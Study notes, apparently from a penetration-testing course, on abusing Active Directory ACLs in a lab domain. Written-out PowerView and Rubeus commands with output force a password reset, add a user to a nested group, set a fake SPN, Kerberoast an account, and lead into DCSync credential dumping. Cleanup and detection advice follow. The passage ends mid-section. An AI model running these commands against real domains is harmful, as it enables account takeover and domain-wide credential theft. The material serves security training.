
### Step 5 — Enumerate Further Using a foreach Loop (Built-in Cmdlets)

```powershell
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | 
    Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
}
```

**Explanation:**
- `Get-ADUser -Filter *` — Retrieves all domain user accounts.
- The output is piped to a text file via `> ad_users.txt`, creating a list of all usernames.
- The `foreach` loop reads each username from the file and uses `Get-Acl` on each AD user object, filtering for entries where our target user (`wley`) appears as the identity reference.
- This approach works without PowerView and is useful when restricted to native Windows tools on a client system.

---

### Step 6 — Further Enumeration of Rights Using damundsen (Chain Through Nested Groups)

```powershell
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

```powershell
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof
--------
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

**Explanation:**
- `Convert-NameToSid damundsen` gets `damundsen`'s SID, stored in `$sid2`, so we can enumerate what rights this account holds.
- The output shows `damundsen` has `GenericWrite` (along with `ListChildren` and `ReadProperty`) over the **Help Desk Level 1** group — meaning they can add any user, including themselves, to this group.
- `Get-DomainGroup -Identity "Help Desk Level 1" | select memberof` reveals this group is **nested inside the Information Technology group** — any member of Help Desk Level 1 automatically inherits all rights granted to the IT group.
- This is the key pivot: adding `damundsen` to Help Desk Level 1 gives us indirect access to everything the IT group controls.

---

### Step 7 — Investigating the Information Technology Group

```powershell
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

**Explanation:**
- `Convert-NameToSid "Information Technology"` gets the SID of the IT group, stored in `$itgroupsid`.
- The output confirms the IT group has `GenericAll` over the user `Angela Dunn (adunn)` — **full control** over that account.
- With `GenericAll`, we can: modify group membership, force change the password, or perform a targeted Kerberoasting attack by writing a fake SPN to the account.
- Since `damundsen` can join the Help Desk Level 1 group, and Help Desk Level 1 is nested inside IT, adding `damundsen` to Help Desk Level 1 indirectly gives us `GenericAll` over `adunn`.

---

### Step 8 — Looking for Interesting Access on adunn (DCSync Rights)

```powershell
PS C:\htb> $adunnsid = Convert-NameToSid adunn
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
...

<SNIP>
```

**Explanation:**
- `Convert-NameToSid adunn` gets `adunn`'s SID stored in `$adunnsid`.
- The output shows `adunn` has **two critical replication rights** over the domain object (`DC=INLANEFREIGHT,DC=LOCAL`):
  - `DS-Replication-Get-Changes` — allows replication of standard domain data.
  - `DS-Replication-Get-Changes-In-Filtered-Set` — allows replication of secret/sensitive data (passwords).
- Together, these two extended rights constitute **DCSync privileges** — this account can replicate password hashes for all domain users directly from the Domain Controller without being a Domain Admin.
- This is the end goal of our ACL attack chain: compromise `adunn` to perform a DCSync and obtain all NTLM hashes in the domain.

---

## 18.2 Enumerating ACLs with BloodHound

BloodHound significantly simplifies ACL enumeration by providing a graphical visualization of the attack path. After importing SharpHound data into BloodHound, the following workflow is used:

1. Set `wley` as the starting node.
2. Navigate to the **Node Info** tab and scroll to **Outbound Control Rights**.
3. Click **First Degree Object Control** to see direct control rights (e.g., `ForceChangePassword` over `damundsen`).
4. Click **Transitive Object Control** to see the full attack chain (16 objects in this example).
5. Right-click on relationship lines and select **Help** to get detailed abuse instructions, OPSEC considerations, and external references.
6. Use pre-built queries (e.g., "Find Principals with DCSync Rights") to confirm specific rights like `adunn`'s DCSync privileges.

---

# 19. ACL Abuse Tactics

## 19.1 Full Attack Chain Overview

Before executing, here is a full recap of the situation and goal:

- We control the user `wley` whose **NTLMv2 hash** was captured via **Responder** and cracked offline with **Hashcat**, recovering the cleartext password.
- We know that `wley` → can **force change** password of `damundsen` (ForceChangePassword right)
- `damundsen` → can **add members** to Help Desk Level 1 (GenericWrite right)
- Help Desk Level 1 is **nested inside Information Technology**, whose members have **GenericAll** over `adunn`
- `adunn` has **DCSync privileges** — obtaining `adunn`'s credentials allows us to dump all NTLM hashes from the domain, escalate to Domain/Enterprise Admin, and achieve full domain compromise with persistence

The attack chain steps:
1. Use `wley` to **force-change** the password of `damundsen`
2. Authenticate as `damundsen` and **add ourselves to Help Desk Level 1** (via GenericWrite)
3. Leverage nested group membership in Information Technology → **GenericAll over adunn**
4. Use GenericAll to **create a fake SPN and Kerberoast** `adunn`
5. Crack the hash offline → **authenticate as adunn** → perform **DCSync** for full domain compromise

---

## 19.2 Step-by-Step Exploitation Commands

### Creating a PSCredential Object for wley

We start by opening a PowerShell console and authenticating as the `wley` user. We can skip this step if we are already running in the context of that user. To authenticate as `wley`, we create a **PSCredential object**:

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

**Explanation:**
- `ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force` — converts the plaintext password recovered from Hashcat into a `SecureString` object, which PowerShell requires for handling passwords securely.
- `New-Object System.Management.Automation.PSCredential` — creates a credential object pairing the domain username (`INLANEFREIGHT\wley`) with the secure password. This object is passed with `-Credential` to subsequent commands to act as `wley`.

---

### Creating a SecureString Object for damundsen's New Password

Next, we create a `SecureString` representing the new password we want to set on `damundsen`:

```powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

**Explanation:**
- This stores the new password (`Pwn3d_by_ACLs!`) as a `SecureString` in the variable `$damundsenPassword`.
- This variable is passed as the `-AccountPassword` parameter in the next command.
- The password itself is our choice — it just needs to meet the domain password policy requirements.

---

### Changing the User's Password (Set-DomainUserPassword)

Now we use PowerView's `Set-DomainUserPassword` to reset `damundsen`'s password while authenticating as `wley`:

```powershell
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

**Explanation:**
- `Import-Module .\PowerView.ps1` — loads PowerView from the `C:\Tools\` directory.
- `Set-DomainUserPassword` — PowerView function that resets a domain user's password.
- `-Identity damundsen` — targets the `damundsen` account.
- `-AccountPassword $damundsenPassword` — the new password as a `SecureString`.
- `-Credential $Cred` — authenticates the action using `wley`'s credentials (since `wley` holds `ForceChangePassword` over `damundsen`).
- `-Verbose` — prints step-by-step feedback; the output confirms `Password for user 'damundsen' successfully reset`.
- This could also be done from a Linux host using **pth-net** (part of the pth-toolkit): `pth-net rpc password`.

---

### Creating a SecureString Object Using damundsen

Now that we've set `damundsen`'s password, we authenticate as `damundsen` by creating a new credential object:

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

**Explanation:**
- We reuse `ConvertTo-SecureString` with the new password we just set (`Pwn3d_by_ACLs!`).
- `$Cred2` is the credential object for `damundsen`, which will be used in all subsequent commands since `damundsen` is the one with `GenericWrite` over the Help Desk Level 1 group.

---

### Adding damundsen to the Help Desk Level 1 Group

First confirm `damundsen` is not already a member, then add them:

```powershell
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

**Explanation:**
- `Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members` — lists all current members of the group in Distinguished Name (DN) format.
- `damundsen` is not listed — confirming they are not already a member and that our addition will be a new change we need to document and later clean up.

Now add `damundsen` to the group:

```powershell
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

**Explanation:**
- `Add-DomainGroupMember` — PowerView function that adds a user to a domain group.
- `-Identity 'Help Desk Level 1'` — the target group.
- `-Members 'damundsen'` — the account being added.
- `-Credential $Cred2` — authenticates as `damundsen`, who holds `GenericWrite` over this group.
- The verbose output confirms the member was added successfully.
- This could also be done from a Linux host using **pth-toolkit**: `pth-net rpc group addmem`.

---

### Confirming damundsen was Added to the Group

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne
```

**Explanation:**
- `Get-DomainGroupMember` retrieves all members of the specified group by name rather than by DN.
- `damundsen` now appears in the list — confirming the group addition was successful.
- At this point, `damundsen` is a member of Help Desk Level 1, which is **nested inside the Information Technology group**, meaning `damundsen` now inherits `GenericAll` over `adunn`.

---

### Creating a Fake SPN on adunn for Targeted Kerberoasting

Our client permitted us to change `damundsen`'s password, but `adunn` is an **admin account that cannot be interrupted** (i.e., we cannot change its password). Since we have `GenericAll` rights, we instead perform a **targeted Kerberoasting attack** — writing a fake SPN to `adunn`'s account, requesting the TGS ticket, then cracking the hash offline. We must be authenticated as a member of the Information Technology group (which `damundsen` now is, via nested membership).

We can now use **[Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)** to create the fake SPN. `Set-DomainObject` is a PowerSploit/PowerView function that allows modification of any attribute on an Active Directory object when you have the appropriate write permissions. In this case, since we have `GenericAll` over `adunn`, we can write any attribute — including `servicePrincipalName` — making the account temporarily Kerberoastable. We could use the tool **targetedKerberoast** to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

> **Linux alternative:** The tool `targetedKerberoast` can perform this same attack from Linux — it creates a temporary SPN, retrieves the hash, and deletes the SPN all in one command.

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

**Explanation:**
- `Set-DomainObject` — PowerView function that modifies AD object attributes.
- `-Credential $Cred2` — uses `damundsen`'s credentials (who has `GenericAll` over `adunn` via IT group membership).
- `-Identity adunn` — targets `adunn`'s account.
- `-SET @{serviceprincipalname='notahacker/LEGIT'}` — writes a fake SPN (`notahacker/LEGIT`) to the `servicePrincipalName` attribute, making `adunn` a Kerberoastable account.
- The verbose output confirms: `Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'`.

---

### Kerberoasting adunn Using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting
[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
[*] Total kerberoastable users : 1
[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

**Explanation:**
- `Rubeus.exe kerberoast` — requests a TGS (Ticket Granting Service) ticket for the specified user's SPN.
- `/user:adunn` — limits the Kerberoasting to just `adunn`.
- `/nowrap` — prevents the output hash from wrapping across multiple lines, making it ready to paste directly into Hashcat.
- The output confirms `notahacker/LEGIT` as the SPN and shows the full `$krb5tgs$23$...` hash ready for offline cracking.
- The hash can be cracked with Hashcat using mode `13100`: `hashcat -m 13100 <hashfile> /usr/share/wordlists/rockyou.txt`.

> **Once the hash is cracked** and we have `adunn`'s cleartext password, we can now authenticate as `adunn` and perform the **DCSync attack** to retrieve the NTLM password hashes for all users in the domain, which is covered in the next section.

---

## 19.3 Cleanup After the Attack

Cleanup must be performed in a **specific order** because our rights depend on `damundsen` still being in the group:

**Cleanup Order:**
1. Remove the fake SPN from `adunn`'s account *(must be done first, while we still have GenericAll rights via group membership)*
2. Remove `damundsen` from the Help Desk Level 1 group
3. Set `damundsen`'s password back to its original value (if known), or notify the client to reset it/alert the user

> If you remove `damundsen` from the group **first**, you lose `GenericAll` over `adunn` and will no longer be able to clear the fake SPN. Always clean up in this order.

---

### Step 1 — Removing the Fake SPN from adunn's Account

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

**Explanation:**
- `Set-DomainObject` with `-Clear serviceprincipalname` — removes the `servicePrincipalName` attribute from `adunn`'s account entirely, undoing the fake SPN we added.
- `-Credential $Cred2` — must still use `damundsen`'s credentials since `damundsen` is still in the IT group (with `GenericAll` rights) at this point.
- The verbose output confirms: `Clearing 'serviceprincipalname' for object 'adunn'`.
- This is performed **first** because once `damundsen` is removed from the group in Step 2, we lose the `GenericAll` right over `adunn` and can no longer modify their attributes.

---

### Step 2 — Removing damundsen from the Help Desk Level 1 Group

```powershell
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

**Explanation:**
- `Remove-DomainGroupMember` — PowerView function that removes a user from a domain group; reverses our earlier `Add-DomainGroupMember`.
- `-Credential $Cred2` — uses `damundsen`'s credentials.
- The output `True` confirms the removal was successful.

---

### Confirming damundsen was Removed from the Group

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'} -Verbose
```

**Explanation:**
- If the command returns **no output**, `damundsen` has been successfully removed from the group.
- An empty result here is the expected/desired outcome confirming cleanup is complete.

---

### Step 3 — Reset damundsen's Password

The third cleanup step is to restore `damundsen`'s password:
- If the **original password is known**, reset it back using `Set-DomainUserPassword` with `wley`'s credentials.
- If the **original password is unknown** (most likely), notify the client so they can reset it themselves and alert `damundsen` to change their password.

> Even after full cleanup, every modification made during the assessment must be **documented in the final report**. The client needs to know exactly what changed, when, and that all changes were reverted. This protects both the tester and the client if questions arise later.

---

### Real-World Note on ACL Attack Chains

This was one example attack path in a fictional lab environment, but similar attack chains are commonly encountered in real-world engagements. A few important considerations:

- In a **large domain**, there could be many ACL attack paths — some shorter and more direct, others longer and more complex.
- Sometimes an ACL attack chain is **too time-consuming or potentially destructive** for the scope of the assessment. In those cases, it may be preferable to **enumerate the path and present evidence** to the client without executing all the steps, giving them enough information to understand and remediate the issue on their own.
- Always **communicate with the client** before performing destructive or disruptive actions (like password changes), and ensure written approval is obtained.
- Each change must be recorded with **start time, end time, and revert confirmation** in your assessment notes.

---



## 19.4 Detection and Remediation of ACL Abuse

Organizations should implement the following countermeasures:

- **Audit and remove dangerous ACLs** — Regularly run tools like BloodHound to identify and remove overly permissive ACEs.
- **Monitor group membership** — Set up alerts for changes to high-impact groups; any modification could indicate an ACL attack chain.
- **Audit for ACL changes using Event ID 5136** — Enable the Advanced Security Audit Policy. Event ID `5136: A directory service object was modified` is triggered when domain objects are modified, which may indicate ACL tampering.

### Convert SDDL String to Human-Readable Format

```powershell
PS C:\htb> ConvertFrom-SddlString "<SDDL_STRING_HERE>"
```

**Explanation:**
- When Event ID 5136 is captured, the permission change is recorded in **SDDL (Security Descriptor Definition Language)** format, which is not human-readable.
- `ConvertFrom-SddlString` converts this SDDL data into a readable format showing `Owner`, `Group`, `DiscretionaryAcl`, and `SystemAcl` properties.
- Filter on `DiscretionaryAcl` to identify suspicious entries such as `GenericWrite` granted to non-admin users.

---

# 20. DCSync Attack

## 20.1 What is DCSync and How Does it Work?

DCSync is a powerful attack technique for stealing the Active Directory password database by abusing the built-in **Directory Replication Service Remote Protocol (DS-RPC)**, which Domain Controllers use to replicate domain data. The attacker mimics a Domain Controller to request user NTLM password hashes directly from another DC. The attack relies on the `DS-Replication-Get-Changes-All` extended right — an access control right that permits replication of secret (password) data.

To perform this attack, you must have control over an account that has the rights to perform domain replication — specifically a user with the **Replicating Directory Changes** and **Replicating Directory Changes All** permissions set. Domain/Enterprise Admins and default domain administrators have this right by default. However, it is common during an assessment to find other non-admin accounts that have been granted these rights, either intentionally for a specific purpose or accidentally through a misconfiguration.

Once such an account is compromised, its access can be used to retrieve the **current NTLM password hash** for any domain user, as well as hashes corresponding to their **previous passwords** (via password history). This makes DCSync one of the most impactful attacks available once replication rights are identified.

> **Note:** If you have certain rights such as `WriteDacl` over a user account, you could also **add** the replication privilege to a user you control, perform the DCSync, and then **remove the privilege** to attempt to cover your tracks.

DCSync can be performed using tools such as **Mimikatz**, **Invoke-DCSync**, and **Impacket's secretsdump.py**.

---

## 20.2 Verifying Replication Rights

### Viewing adunn's Replication Privileges through ADSI Edit

The replication rights can be viewed graphically via **ADSI Edit** (adsiedit.msc) by navigating to the domain root object (`DC=INLANEFREIGHT,DC=LOCAL`), opening its properties, going to the **Security** tab, and viewing the permissions for the `adunn` account. This shows the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights assigned to a standard domain user — a clear misconfiguration that enables the DCSync attack.

Here we have a standard domain user (`adunn`) that has been granted the replicating permissions outside of their normal role. Let's confirm this programmatically.

---

### Using Get-DomainUser to View adunn's Group Membership

```powershell
PS C:\htb> Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

**Explanation:**
- `Get-DomainUser -Identity adunn` retrieves the full object attributes for the `adunn` account.
- The `memberof` field shows `adunn` is only a member of standard groups like **VPN Users**, **Printer Access**, and **File Share H Drive** — confirming this is a **standard domain user**, not a Domain Admin or privileged built-in account.
- `useraccountcontrol: NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD` — a typical non-admin account configuration.
- The `objectsid` value (`...1164`) is what we use in the next command to search ACLs specifically for this account.
- This confirms we are working with a regular user that has been granted replication rights via a direct ACL assignment — a dangerous misconfiguration.

---

### Using Get-ObjectAcl to Check adunn's Replication Rights

PowerView can be used to confirm this standard user does indeed have the necessary replication permissions. We first get the user's SID from the command above and then check all ACLs set on the domain object (`DC=inlanefreight,DC=local`) using `Get-ObjectAcl`, searching specifically for replication rights:

```powershell
PS C:\htb> $sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

**Explanation:**
- `$sid = "S-1-5-21-...1164"` — stores `adunn`'s SID for filtering.
- `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs` — retrieves all ACEs on the domain root object with human-readable right names.
- `$_.ObjectAceType -match 'Replication-Get'` — filters to only show replication-related extended rights.
- `$_.SecurityIdentifier -match $sid` — further filters to only show entries where `adunn`'s SID is the principal.
- The output confirms `adunn` (SID ending in `1164`) has **three** replication rights on the domain object:
  - `DS-Replication-Get-Changes` — allows replicating general domain data.
  - `DS-Replication-Get-Changes-All` — allows replicating **secret data including password hashes** — the critical right for DCSync.
  - `DS-Replication-Get-Changes-In-Filtered-Set` — allows replicating filtered/read-only DC data.
- Together, these three rights confirm `adunn` **can perform a full DCSync attack**.
- The first two entries (SIDs ending in `498` and `516`) belong to default built-in groups (Enterprise Read-Only DCs and Domain Controllers) — these are expected. Only `adunn`'s SID (`1164`) is abnormal.

---

## 20.3 Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file. If we had certain rights over the user (such as **WriteDacl**), we could also add this replication privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.

```bash
